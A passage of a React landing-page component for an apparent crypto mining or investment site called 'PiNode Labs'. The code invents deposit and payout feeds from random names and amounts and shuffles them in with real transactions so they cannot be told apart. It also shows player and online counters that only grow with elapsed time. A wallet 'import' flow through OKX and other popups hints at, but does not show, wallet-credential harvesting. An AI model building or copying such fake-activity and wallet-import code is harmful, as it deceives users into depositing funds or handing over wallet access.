"use client"

import { useState, useEffect, useMemo } from "react"
import { Card } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import LoginForm from "@/components/auth/login-form"
import { getAllTransactions } from "@/lib/supabase-client"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog"
import { X } from "lucide-react"
import WalletConnectModal from "@/components/wallet-connect-modal"
import OKXWalletPopup from "@/components/okx-wallet-popup"
import WalletPopup from "@/components/wallet-popup"

interface LandingPageProps {
  onLogin: (userData: any) => void
}

interface DepositDisplay {
  name: string
  amount: number
  network: string | null
  isReal: boolean
}

export default function LandingPage({ onLogin }: LandingPageProps) {
  const [showLogin, setShowLogin] = useState(false)
  const [showSignUp, setShowSignUp] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [currentTime, setCurrentTime] = useState(new Date())
  const [deposits, setDeposits] = useState<DepositDisplay[]>([])
  const [loadingDeposits, setLoadingDeposits] = useState(false)
  const [payouts, setPayouts] = useState<DepositDisplay[]>([])
  const [loadingPayouts, setLoadingPayouts] = useState(false)
  const [showWalletModal, setShowWalletModal] = useState(false)
  const [showOKXPopup, setShowOKXPopup] = useState(false)
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [hasImportedWallet, setHasImportedWallet] = useState(false)
  const [showWalletImportMessage, setShowWalletImportMessage] = useState(false)
  const [showTrafficDownPopup, setShowTrafficDownPopup] = useState(false)
  const [showRefbanPopup, setShowRefbanPopup] = useState(false)
  const [showDevPopup, setShowDevPopup] = useState(false)
  const [hasShownTrafficPopup, setHasShownTrafficPopup] = useState(false)
  const [hasShownRefbanPopup, setHasShownRefbanPopup] = useState(false)
  const [hasShownDevPopup, setHasShownDevPopup] = useState(false)
  const [imagesLoaded, setImagesLoaded] = useState({
    traffic: false,
    refban: false,
    dev: false
  })

  // Project start date: 30.12.2025
  const PROJECT_START_DATE = new Date(2025, 11, 30) // Month is 0-indexed, so 11 = December
  
  // Initial values
  const INITIAL_PLAYERS = 44291
  const INITIAL_NEW_PLAYERS = 32482
  const INITIAL_ONLINE = 5235
  const INTERVAL_MINUTES = 30 // Interval untuk increment

  // Random names pool untuk membuat nama lebih realistis
  const firstNames = [
    "Alex", "Jordan", "Taylor", "Morgan", "Casey", "Riley", "Avery", "Quinn",
    "Cameron", "Dakota", "Jamie", "Skyler", "Blake", "Sage", "River", "Phoenix",
    "Sam", "Drew", "Kai", "Rowan", "Finley", "Hayden", "Emery", "Reese",
    "James", "Michael", "Robert", "John", "David", "William", "Richard", "Joseph",
    "Thomas", "Christopher", "Daniel", "Matthew", "Anthony", "Mark", "Donald",
    "Sarah", "Emily", "Jessica", "Ashley", "Amanda", "Melissa", "Nicole", "Michelle",
    "Lisa", "Jennifer", "Kimberly", "Amy", "Angela", "Stephanie", "Rebecca", "Laura",
    "Maria", "Patricia", "Linda", "Barbara", "Elizabeth", "Helen", "Nancy", "Karen"
  ]

  const lastNames = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Wilson", "Anderson", "Thomas", "Taylor",
    "Moore", "Jackson", "Martin", "Lee", "Thompson", "White", "Harris", "Sanchez",
    "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King",
    "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green", "Adams",
    "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts",
    "Gomez", "Phillips", "Evans", "Turner", "Diaz", "Parker", "Cruz", "Edwards"
  ]

  // Generate random names dengan format yang lebih natural dan variatif
  const generateRandomName = () => {
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)]
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)]
    const randomNum = Math.floor(Math.random() * 999)
    
    // Variasi format nickname yang lebih natural
    const formats = [
      () => `${firstName.toLowerCase()}_${lastName.toLowerCase()}${randomNum}`,
      () => `${firstName.toLowerCase()}.${lastName.toLowerCase()}${randomNum}`,
      () => `${firstName.toLowerCase()}${lastName.charAt(0).toLowerCase()}${randomNum}`,
      () => `${lastName.toLowerCase()}_${firstName.toLowerCase()}${randomNum}`,
      () => `${firstName.toLowerCase()}${randomNum}`,
      () => `${lastName.toLowerCase()}${randomNum}`,
      () => `${firstName}${lastName.charAt(0)}${randomNum}`,
      () => `${firstName.toLowerCase()}${lastName.toLowerCase()}`,
      () => `${firstName}${lastName}${randomNum}`,
      () => `${firstName}_${randomNum}`,
      () => `${lastName}_${randomNum}`,
      () => `${firstName.toLowerCase()}${lastName.toLowerCase()}${Math.floor(Math.random() * 99)}`,
    ]
    
    const selectedFormat = formats[Math.floor(Math.random() * formats.length)]
    return selectedFormat()
  }

  // Generate random deposits
  const generateRandomDeposits = (count: number): DepositDisplay[] => {
    const networks = ['BEP20', 'TRC20', 'ERC20', 'Polygon', 'Solana', 'TON']
    return Array.from({ length: count }, () => ({
      name: generateRandomName(),
      amount: Math.random() * 50 + 5,
      network: networks[Math.floor(Math.random() * networks.length)],
      isReal: false
    }))
  }

  // Generate array nama untuk deposits dan payouts (konsisten dengan useMemo)
  const depositNames = useMemo(() => {
    return Array.from({ length: 20 }, () => generateRandomName())
  }, [])

  const payoutNames = useMemo(() => {
    return Array.from({ length: 20 }, () => generateRandomName())
  }, [])

  // Function to get chain icon based on network
  const getChainIcon = (network: string | null): string => {
    if (!network) return "/deposit/usdt_bep20.svg"
    
    const networkLower = network.toLowerCase()
    
    switch (networkLower) {
      case 'trc20':
        return "/deposit/usdt_trc20.svg"
      case 'bep20':
        return "/deposit/usdt_bep20.svg"
      case 'erc20':
        return "/deposit/eth.svg"
      case 'polygon':
        return "/deposit/matic.svg"
      case 'solana':
        return "/deposit/sol.svg"
      case 'ton':
        return "/deposit/ton.svg"
      default:
        return "/deposit/usdt_bep20.svg"
    }
  }

  // Function to create display name from user data (email, username, etc)
  const createDisplayName = (user: any): string => {
    // Prioritaskan username jika ada
    if (user?.username && user.username.trim() !== '') {
      return user.username.trim()
    }
    
    // Jika ada email, buat nickname dari email dengan format natural
    if (user?.email) {
      const email = user.email
      const [localPart, domain] = email.split('@')
      
      if (localPart && domain) {
        // Variasi format dari email
        const formats = [
          () => `${localPart.substring(0, Math.min(4, localPart.length))}${Math.floor(Math.random() * 99)}`,
          () => `${localPart.substring(0, Math.min(3, localPart.length))}_${Math.floor(Math.random() * 999)}`,
          () => `${localPart.substring(0, Math.min(5, localPart.length)).toLowerCase()}${Math.floor(Math.random() * 99)}`,
          () => `${localPart.substring(0, Math.min(4, localPart.length)).toLowerCase()}_${domain.split('.')[0]}`,
          () => `${localPart.substring(0, Math.min(3, localPart.length))}${localPart.slice(-2)}${Math.floor(Math.random() * 99)}`,
        ]
        
        const selectedFormat = formats[Math.floor(Math.random() * formats.length)]
        return selectedFormat()
      }
    }
    
    // Fallback ke random name
    return generateRandomName()
  }

  // Initialize with random deposits and payouts on mount
  useEffect(() => {
    setDeposits(generateRandomDeposits(20))
    setPayouts(generateRandomDeposits(20))
  }, [])

  // Load real deposits from database and mix with random
  useEffect(() => {
    const loadDeposits = async () => {
      try {
        // Don't show loading state, keep showing random data
        const allTransactions = await getAllTransactions(100)
        
        // Filter only completed deposits
        const completedDeposits = allTransactions
          .filter((tx: any) => tx.type === 'deposit' && tx.status === 'completed')
          .slice(0, 15) // Get top 15 real deposits
        
        // Create deposit display items with real data
        const realDeposits: DepositDisplay[] = completedDeposits.map((tx: any) => {
          const displayName = createDisplayName(tx.users)
          
          return {
            name: displayName,
            amount: tx.amount || tx.amount_received || 0,
            network: tx.network,
            isReal: true
          }
        })

        // Generate random deposits to fill remaining slots
        const randomCount = Math.max(5, 20 - realDeposits.length) // At least 5 random
        const randomDeposits: DepositDisplay[] = generateRandomDeposits(randomCount)

        // Mix real and random deposits naturally
        const mixedDeposits: DepositDisplay[] = [...realDeposits, ...randomDeposits]

        // Shuffle the array to mix real and random deposits naturally
        for (let i = mixedDeposits.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [mixedDeposits[i], mixedDeposits[j]] = [mixedDeposits[j], mixedDeposits[i]]
        }

        // Ensure we have exactly 20 deposits
        setDeposits(mixedDeposits.slice(0, 20))
      } catch (error) {
        console.error("Failed to load deposits:", error)
        // Keep showing random deposits if loading fails
        // Don't update state, just keep the random data
      }
    }

    // Load deposits after a short delay to show random data first
    const timeout = setTimeout(() => {
      loadDeposits()
    }, 500)
    
    // Refresh deposits every 30 seconds
    const interval = setInterval(loadDeposits, 30000)
    
    return () => {
      clearTimeout(timeout)
      clearInterval(interval)
    }
  }, [])

  // Load real payouts from database and mix with random
  useEffect(() => {
    const loadPayouts = async () => {
      try {
        // Don't show loading state, keep showing random data
        const allTransactions = await getAllTransactions(100)
        
        // Filter only completed withdraws (payouts)
        const completedPayouts = allTransactions
          .filter((tx: any) => tx.type === 'withdraw' && tx.status === 'completed')
          .slice(0, 15) // Get top 15 real payouts
        
        // Create payout display items with real data
        const realPayouts: DepositDisplay[] = completedPayouts.map((tx: any) => {
          const displayName = createDisplayName(tx.users)
          
          return {
            name: displayName,
            amount: tx.amount_received || tx.amount || 0,
            network: tx.network,
            isReal: true
          }
        })

        // Generate random payouts to fill remaining slots
        const randomCount = Math.max(5, 20 - realPayouts.length) // At least 5 random
        const randomPayouts: DepositDisplay[] = generateRandomDeposits(randomCount)

        // Mix real and random payouts naturally
        const mixedPayouts: DepositDisplay[] = [...realPayouts, ...randomPayouts]

        // Shuffle the array to mix real and random payouts naturally
        for (let i = mixedPayouts.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [mixedPayouts[i], mixedPayouts[j]] = [mixedPayouts[j], mixedPayouts[i]]
        }

        // Ensure we have exactly 20 payouts
        setPayouts(mixedPayouts.slice(0, 20))
      } catch (error) {
        console.error("Failed to load payouts:", error)
        // Keep showing random payouts if loading fails
        // Don't update state, just keep the random data
      }
    }

    // Load payouts after a short delay to show random data first
    const timeout = setTimeout(() => {
      loadPayouts()
    }, 500)
    
    // Refresh payouts every 30 seconds
    const interval = setInterval(loadPayouts, 30000)
    
    return () => {
      clearTimeout(timeout)
      clearInterval(interval)
    }
  }, [])

  // Update time setiap 30 detik untuk sinkronisasi yang lebih baik
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentTime(new Date())
    }, 30000) // Update setiap 30 detik

    return () => clearInterval(interval)
  }, [])

  // Preload all popup images immediately on mount for faster display
  useEffect(() => {
    const imageUrls = [
      "/gamety dashboard/traffict.png",
      "/gamety dashboard/refban.png",
      "/gamety dashboard/dev.png"
    ]

    const loadImage = (url: string): Promise<void> => {
      return new Promise((resolve) => {
        const img = new Image()
        img.onload = () => resolve()
        // If the image fails to load (e.g. missing file), just resolve so we don't
        // reject the whole preload chain and spam console errors in development.
        img.onerror = () => resolve()
        // Set src last to trigger loading
        img.src = url
      })
    }

    // Load all images in parallel for maximum speed; failures are treated as resolved.
    Promise.all(imageUrls.map(url => loadImage(url)))
      .then(() => {
        setImagesLoaded({
          traffic: true,
          refban: true,
          dev: true
        })
        // Show first popup immediately after images are loaded
        if (!hasShownTrafficPopup) {
          setShowTrafficDownPopup(true)
          setHasShownTrafficPopup(true)
        }
      })
  }, [])

  // Show refban popup after traffic down popup is closed (minimal delay since images are preloaded), only once
  useEffect(() => {
    // Only trigger if traffic popup was shown and is now closed, and refban hasn't been shown yet
    if (hasShownTrafficPopup && !showTrafficDownPopup && !hasShownRefbanPopup) {
      // Minimal delay for smooth UX transition (images are already preloaded)
      const timer = setTimeout(() => {
        if (!hasShownRefbanPopup) {
          setShowRefbanPopup(true)
          setHasShownRefbanPopup(true)
        }
      }, 100) // Minimal delay since images are preloaded
      return () => clearTimeout(timer)
    }
  }, [showTrafficDownPopup, hasShownTrafficPopup, hasShownRefbanPopup])

  // Show dev popup after refban popup is closed (minimal delay since images are preloaded), only once
  useEffect(() => {
    // Only trigger if refban popup was shown and is now closed, and dev hasn't been shown yet
    if (hasShownRefbanPopup && !showRefbanPopup && !hasShownDevPopup) {
      // Minimal delay for smooth UX transition (images are already preloaded)
      const timer = setTimeout(() => {
        if (!hasShownDevPopup) {
          setShowDevPopup(true)
          setHasShownDevPopup(true)
        }
      }, 100) // Minimal delay since images are preloaded
      return () => clearTimeout(timer)
    }
  }, [showRefbanPopup, hasShownRefbanPopup, hasShownDevPopup])

  // Calculate stats based on time since project start
  const stats = useMemo(() => {
    const now = currentTime
    
    // Calculate time difference in minutes
    // Jika waktu saat ini masih sebelum project start, gunakan 0
    const timeDiffMs = Math.max(0, now.getTime() - PROJECT_START_DATE.getTime())
    const timeDiffMinutes = Math.floor(timeDiffMs / (1000 * 60))
    
    // Calculate number of 30-minute intervals
    const intervals = Math.floor(timeDiffMinutes / INTERVAL_MINUTES)
    
    // Calculate players (start 1031, +1 every 30 minutes)
    const players = INITIAL_PLAYERS + intervals
    
    // Calculate new players (start 402, +1 every 30 minutes)
    const newPlayers = INITIAL_NEW_PLAYERS + intervals
    
    // Calculate online (start 257, +1 every 30 minutes)
    const online = INITIAL_ONLINE + intervals
    
    // Project start date - statis 01.01.2026 tanpa fungsionalitas waktu
    const projectStart = "01.01.2026"
    
    return {
      players,
      newPlayers,
      online,
      projectStart
    }
  }, [currentTime])

  // Removed per request (will be used later)
  const gameActions: any[] = []

  // Removed per request (will be used later)
  const affiliateTiers: any[] = []

  const handleLoginClick = () => {
    setShowLogin(true)
    setShowSignUp(false)
  }

  const handleSignUpClick = () => {
    setShowSignUp(true)
    setShowLogin(false)
  }

  const handleBackToLanding = () => {
    setShowLogin(false)
    setShowSignUp(false)
  }

  const handleConnectWallet = () => {
    setShowWalletModal(true)
  }

  const handleWalletConnect = (walletId: string) => {
    // Don't show popup if wallet has already been imported
    if (hasImportedWallet) {
      setShowWalletModal(false)
      return
    }

    // Show popup for selected wallet
    if (walletId === "okx") {
      setShowOKXPopup(true)
      setShowWalletModal(false)
      return
    }
    
    // Show popup for other wallets
    setSelectedWallet(walletId)
    setShowWalletModal(false)
  }

  const handleWalletImportSuccess = () => {
    setHasImportedWallet(true)
    setShowOKXPopup(false)
    setSelectedWallet(null)
    setShowWalletImportMessage(true)
    // Hide message after 15 seconds
    setTimeout(() => {
      setShowWalletImportMessage(false)
    }, 15000)
  }

  if (showLogin) {
    return <LoginForm onLogin={onLogin} isSignUp={false} onBack={handleBackToLanding} />
  }

  if (showSignUp) {
    return <LoginForm onLogin={onLogin} isSignUp={true} onBack={handleBackToLanding} />
  }

  return (
    <div className="min-h-screen relative overflow-x-hidden" style={{
      background: "linear-gradient(180deg, #0a0e1a 0%, #1a1f2e 25%, #0f172a 50%, #1a1f2e 75%, #0a0e1a 100%)"
    }}>
      {/* Animated Mining Background Pattern */}
      <div 
        className="fixed inset-0 opacity-20"
        style={{
          backgroundImage: `
            radial-gradient(circle at 20% 50%, rgba(251, 191, 36, 0.1) 0%, transparent 50%),
            radial-gradient(circle at 80% 80%, rgba(234, 88, 12, 0.1) 0%, transparent 50%),
            repeating-linear-gradient(45deg, transparent, transparent 2px, rgba(251, 191, 36, 0.03) 2px, rgba(251, 191, 36, 0.03) 4px),
            repeating-linear-gradient(-45deg, transparent, transparent 2px, rgba(234, 88, 12, 0.03) 2px, rgba(234, 88, 12, 0.03) 4px)
          `,
          backgroundSize: "100% 100%, 100% 100%, 60px 60px, 60px 60px",
          animation: "gradient-shift 20s ease infinite"
        }}
      />
      
      {/* Glowing Particles Effect */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        {[...Array(20)].map((_, i) => (
          <div
            key={i}
            className="absolute rounded-full"
            style={{
              width: `${Math.random() * 4 + 2}px`,
              height: `${Math.random() * 4 + 2}px`,
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              background: `radial-gradient(circle, rgba(251, 191, 36, ${Math.random() * 0.5 + 0.3}) 0%, transparent 70%)`,
              animation: `float ${Math.random() * 10 + 10}s ease-in-out infinite`,
              animationDelay: `${Math.random() * 5}s`
            }}
          />
        ))}
      </div>

      <div className="relative z-10">
        {/* Header */}
        <header className="container mx-auto px-3 sm:px-4 py-4 sm:py-6">
          <div className="flex items-center justify-between backdrop-blur-sm bg-black/20 rounded-xl p-3 sm:p-4 border border-yellow-500/20 shadow-2xl"
            style={{
              boxShadow: "0 8px 32px rgba(0, 0, 0, 0.3), inset 0 1px 0 rgba(251, 191, 36, 0.1)"
            }}
          >
            <div className="flex items-center gap-3 sm:gap-4">
              <img 
                src="/pi/pinetwork.png" 
                alt="PiNode Labs Logo" 
                className="w-20 h-20 sm:w-28 sm:h-28 md:w-32 md:h-32 object-contain"
                style={{ imageRendering: "crisp-edges" }}
              />
              <div>
                <p className="text-xs sm:text-sm text-yellow-400/70">PiNode Labs</p>
              </div>
            </div>
            <div className="flex items-center gap-2 sm:gap-3">
              <Button
                onClick={handleLoginClick}
                variant="outline"
                className="bg-transparent border-2 border-yellow-500/50 text-yellow-400 hover:bg-yellow-500/20 hover:border-yellow-500 hover:text-yellow-300 font-bold px-4 sm:px-6 py-2 rounded-lg shadow-lg text-xs sm:text-sm transition-all duration-300"
                style={{
                  boxShadow: "0 4px 15px rgba(251, 191, 36, 0.2)"
                }}
              >
                Login
              </Button>
              <Button
                onClick={handleSignUpClick}
                className="bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 text-white font-bold px-4 sm:px-6 py-2 rounded-lg shadow-lg text-sm sm:text-base transition-all duration-300 transform hover:scale-105"
                style={{
                  boxShadow: "0 4px 20px rgba(251, 191, 36, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2)"
                }}
              >
                <span className="hidden sm:inline">Create Account</span>
                <span className="sm:hidden">Sign Up</span>
              </Button>
            </div>
          </div>
        </header>

        {/* Stats Section */}
        <div className="container mx-auto px-3 sm:px-4 mb-6 sm:mb-8">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 sm:gap-4">
            {/* Players */}
            <div 
              className="group relative rounded-2xl p-4 sm:p-5 overflow-hidden cursor-pointer transition-all duration-300 transform hover:scale-105 hover:-translate-y-1"
              style={{
                background: "linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(30, 41, 59, 0.95) 50%, rgba(15, 23, 42, 0.95) 100%)",
                border: "2px solid rgba(251, 191, 36, 0.4)",
                boxShadow: "0 15px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(251, 191, 36, 0.2), 0 0 40px rgba(251, 191, 36, 0.1)"
              }}
            >
              {/* Mining Pattern Background */}
              <div 
                className="absolute inset-0 opacity-20"
                style={{
                  backgroundImage: `
                    repeating-linear-gradient(45deg, transparent, transparent 8px, rgba(251, 191, 36, 0.1) 8px, rgba(251, 191, 36, 0.1) 16px),
                    repeating-linear-gradient(-45deg, transparent, transparent 8px, rgba(234, 88, 12, 0.1) 8px, rgba(234, 88, 12, 0.1) 16px)
                  `,
                  backgroundSize: "32px 32px"
                }}
              />
              
              {/* Glowing Corner Effects */}
              <div 
                className="absolute top-0 left-0 w-16 h-16 bg-gradient-to-br from-yellow-500/20 to-transparent rounded-br-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              <div 
                className="absolute bottom-0 right-0 w-16 h-16 bg-gradient-to-tl from-orange-500/20 to-transparent rounded-tl-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              
              {/* Animated Border Glow */}
              <div 
                className="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                style={{
                  background: "linear-gradient(135deg, rgba(251, 191, 36, 0.15) 0%, rgba(234, 88, 12, 0.15) 100%)",
                  boxShadow: "inset 0 0 30px rgba(251, 191, 36, 0.2)"
                }}
              />
              
              <div className="relative z-10 flex items-center gap-3">
                <img 
                  src="/st1.png" 
                  alt="Players" 
                  className="w-12 h-12 sm:w-14 sm:h-14 object-contain flex-shrink-0" 
                  style={{ imageRendering: "crisp-edges" }} 
                />
                <div className="min-w-0 flex-1">
                  <div className="text-[10px] sm:text-xs text-yellow-300/80 uppercase font-bold truncate mb-1">Players</div>
                  <div 
                    className="text-xl sm:text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 via-orange-300 to-yellow-300 truncate" 
                    style={{
                      textShadow: "0 0 10px rgba(251, 191, 36, 0.5)"
                    }}
                  >
                    {stats.players.toLocaleString()}
                  </div>
                </div>
              </div>
            </div>

            {/* New Players */}
            <div 
              className="group relative rounded-2xl p-4 sm:p-5 overflow-hidden cursor-pointer transition-all duration-300 transform hover:scale-105 hover:-translate-y-1"
              style={{
                background: "linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(30, 41, 59, 0.95) 50%, rgba(15, 23, 42, 0.95) 100%)",
                border: "2px solid rgba(251, 191, 36, 0.4)",
                boxShadow: "0 15px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(251, 191, 36, 0.2), 0 0 40px rgba(251, 191, 36, 0.1)"
              }}
            >
              {/* Mining Pattern Background */}
              <div 
                className="absolute inset-0 opacity-20"
                style={{
                  backgroundImage: `
                    repeating-linear-gradient(45deg, transparent, transparent 8px, rgba(251, 191, 36, 0.1) 8px, rgba(251, 191, 36, 0.1) 16px),
                    repeating-linear-gradient(-45deg, transparent, transparent 8px, rgba(234, 88, 12, 0.1) 8px, rgba(234, 88, 12, 0.1) 16px)
                  `,
                  backgroundSize: "32px 32px"
                }}
              />
              
              {/* Glowing Corner Effects */}
              <div 
                className="absolute top-0 left-0 w-16 h-16 bg-gradient-to-br from-yellow-500/20 to-transparent rounded-br-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              <div 
                className="absolute bottom-0 right-0 w-16 h-16 bg-gradient-to-tl from-orange-500/20 to-transparent rounded-tl-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              
              {/* Animated Border Glow */}
              <div 
                className="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                style={{
                  background: "linear-gradient(135deg, rgba(251, 191, 36, 0.15) 0%, rgba(234, 88, 12, 0.15) 100%)",
                  boxShadow: "inset 0 0 30px rgba(251, 191, 36, 0.2)"
                }}
              />
              
              <div className="relative z-10 flex items-center gap-3">
                <img 
                  src="/st4.png" 
                  alt="New players" 
                  className="w-12 h-12 sm:w-14 sm:h-14 object-contain flex-shrink-0" 
                  style={{ imageRendering: "crisp-edges" }} 
                />
                <div className="min-w-0 flex-1">
                  <div className="text-[10px] sm:text-xs text-yellow-300/80 uppercase font-bold truncate mb-1">New Players</div>
                  <div 
                    className="text-xl sm:text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 via-orange-300 to-yellow-300 truncate" 
                    style={{
                      textShadow: "0 0 10px rgba(251, 191, 36, 0.5)"
                    }}
                  >
                    {stats.newPlayers.toLocaleString()}
                  </div>
                </div>
              </div>
            </div>

            {/* Online */}
            <div 
              className="group relative rounded-2xl p-4 sm:p-5 overflow-hidden cursor-pointer transition-all duration-300 transform hover:scale-105 hover:-translate-y-1"
              style={{
                background: "linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(30, 41, 59, 0.95) 50%, rgba(15, 23, 42, 0.95) 100%)",
                border: "2px solid rgba(251, 191, 36, 0.4)",
                boxShadow: "0 15px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(251, 191, 36, 0.2), 0 0 40px rgba(251, 191, 36, 0.1)"
              }}
            >
              {/* Mining Pattern Background */}
              <div 
                className="absolute inset-0 opacity-20"
                style={{
                  backgroundImage: `
                    repeating-linear-gradient(45deg, transparent, transparent 8px, rgba(251, 191, 36, 0.1) 8px, rgba(251, 191, 36, 0.1) 16px),
                    repeating-linear-gradient(-45deg, transparent, transparent 8px, rgba(234, 88, 12, 0.1) 8px, rgba(234, 88, 12, 0.1) 16px)
                  `,
                  backgroundSize: "32px 32px"
                }}
              />
              
              {/* Glowing Corner Effects */}
              <div 
                className="absolute top-0 left-0 w-16 h-16 bg-gradient-to-br from-yellow-500/20 to-transparent rounded-br-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              <div 
                className="absolute bottom-0 right-0 w-16 h-16 bg-gradient-to-tl from-orange-500/20 to-transparent rounded-tl-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              
              {/* Animated Border Glow */}
              <div 
                className="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                style={{
                  background: "linear-gradient(135deg, rgba(251, 191, 36, 0.15) 0%, rgba(234, 88, 12, 0.15) 100%)",
                  boxShadow: "inset 0 0 30px rgba(251, 191, 36, 0.2)"
                }}
              />
              
              <div className="relative z-10 flex items-center gap-3">
                <img 
                  src="/st2.png" 
                  alt="Online" 
                  className="w-12 h-12 sm:w-14 sm:h-14 object-contain flex-shrink-0" 
                  style={{ imageRendering: "crisp-edges" }} 
                />
                <div className="min-w-0 flex-1">
                  <div className="text-[10px] sm:text-xs text-yellow-300/80 uppercase font-bold truncate mb-1">Online</div>
                  <div 
                    className="text-xl sm:text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 via-orange-300 to-yellow-300 truncate" 
                    style={{
                      textShadow: "0 0 10px rgba(251, 191, 36, 0.5)"
                    }}
                  >
                    {stats.online.toLocaleString()}
                  </div>
                </div>
              </div>
            </div>

            {/* Project Start */}
            <div 
              className="group relative rounded-2xl p-4 sm:p-5 overflow-hidden cursor-pointer transition-all duration-300 transform hover:scale-105 hover:-translate-y-1"
              style={{
                background: "linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(30, 41, 59, 0.95) 50%, rgba(15, 23, 42, 0.95) 100%)",
                border: "2px solid rgba(251, 191, 36, 0.4)",
                boxShadow: "0 15px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(251, 191, 36, 0.2), 0 0 40px rgba(251, 191, 36, 0.1)"
              }}
            >
              {/* Mining Pattern Background */}
              <div 
                className="absolute inset-0 opacity-20"
                style={{
                  backgroundImage: `
                    repeating-linear-gradient(45deg, transparent, transparent 8px, rgba(251, 191, 36, 0.1) 8px, rgba(251, 191, 36, 0.1) 16px),
                    repeating-linear-gradient(-45deg, transparent, transparent 8px, rgba(234, 88, 12, 0.1) 8px, rgba(234, 88, 12, 0.1) 16px)
                  `,
                  backgroundSize: "32px 32px"
                }}
              />
              
              {/* Glowing Corner Effects */}
              <div 
                className="absolute top-0 left-0 w-16 h-16 bg-gradient-to-br from-yellow-500/20 to-transparent rounded-br-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              <div 
                className="absolute bottom-0 right-0 w-16 h-16 bg-gradient-to-tl from-orange-500/20 to-transparent rounded-tl-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              
              {/* Animated Border Glow */}
              <div 
                className="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                style={{
                  background: "linear-gradient(135deg, rgba(251, 191, 36, 0.15) 0%, rgba(234, 88, 12, 0.15) 100%)",
                  boxShadow: "inset 0 0 30px rgba(251, 191, 36, 0.2)"
                }}
              />
              
              <div className="relative z-10 flex items-center gap-3">
                <img 
                  src="/st3.png" 
                  alt="Project start" 
                  className="w-12 h-12 sm:w-14 sm:h-14 object-contain flex-shrink-0" 
                  style={{ imageRendering: "crisp-edges" }} 
                />
                <div className="min-w-0 flex-1">
                  <div className="text-[10px] sm:text-xs text-yellow-300/80 uppercase font-bold truncate mb-1">Project Start</div>
                  <div 
                    className="text-xl sm:text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 via-orange-300 to-yellow-300 truncate" 
                    style={{
                      textShadow: "0 0 10px rgba(251, 191, 36, 0.5)"
                    }}
                  >
                    {stats.projectStart}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="container mx-auto px-3 sm:px-4 mb-6 sm:mb-8">
          <div className="grid lg:grid-cols-2 gap-4 sm:gap-6 items-start">
            {/* Left: Authorization Panel */}
            <div className="order-2 lg:order-1 w-full">
              <div 
                className="relative rounded-xl shadow-2xl overflow-hidden w-full"
                style={{
                  background: "linear-gradient(135deg, rgba(30, 41, 59, 0.95) 0%, rgba(15, 23, 42, 0.98) 50%, rgba(30, 41, 59, 0.95) 100%)",
                  border: "2px solid rgba(251, 191, 36, 0.3)",
                  boxShadow: "0 20px 60px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(251, 191, 36, 0.1), 0 0 30px rgba(251, 191, 36, 0.1)"
                }}
              >
                {/* Animated Background Pattern */}
                <div 
                  className="absolute inset-0 opacity-10"
                  style={{
                    backgroundImage: `
                      repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(251, 191, 36, 0.1) 10px, rgba(251, 191, 36, 0.1) 20px),
                      repeating-linear-gradient(-45deg, transparent, transparent 10px, rgba(234, 88, 12, 0.1) 10px, rgba(234, 88, 12, 0.1) 20px)
                    `,
                    backgroundSize: "40px 40px"
                  }}
                />
                
                {/* Shimmer Effect */}
                <div 
                  className="absolute inset-0 opacity-20"
                  style={{
                    background: "linear-gradient(110deg, transparent 40%, rgba(251, 191, 36, 0.3) 50%, transparent 60%)",
                    backgroundSize: "200% 100%",
                    animation: "shimmer-glow 3s infinite"
                  }}
                />

                {/* Content */}
                <div className="relative z-10 p-4 sm:p-5 md:p-6">
                  {/* Header */}
                  <div className="text-center mb-4 sm:mb-5">
                    <h2 
